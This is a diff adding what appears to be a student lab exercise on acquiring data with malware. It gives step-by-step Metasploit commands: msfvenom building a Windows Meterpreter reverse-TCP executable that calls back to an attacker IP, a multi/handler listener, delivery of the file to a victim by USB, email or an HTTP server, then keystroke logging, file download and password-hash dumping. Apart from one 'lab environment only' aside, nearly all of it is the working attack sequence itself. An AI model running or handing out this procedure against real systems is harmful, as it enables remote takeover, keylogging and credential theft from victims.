@@ -1,0 +1,30 @@
+Experiment 6:
+Acquisition of data: to learn the methods to acquire/gain access to data using virus/malware file.
+
+ping ipaddress
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=<Port> -f exe 
+> malware.exe
+Replace <Attacker_IP> and <Port> with your Kali Linux IP and desired port.
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <Attacker_IP>
+set LPORT 4444
+exploit
+sysinfo
+
+Transfer the malware.exe file to the victim machine via USB simulation, email, or file 
+sharing (in a lab environment only).
+Or use separate port to access using browser
+
+in kali terminal 
+python3 -m http.server 9090
+
+4. Execute Malware on the Victim Machine
+Run the malware.exe file on the victim machine.
+ls
+keyscan_start
+keyscan_dump
+download <file_path> 
+hashdump
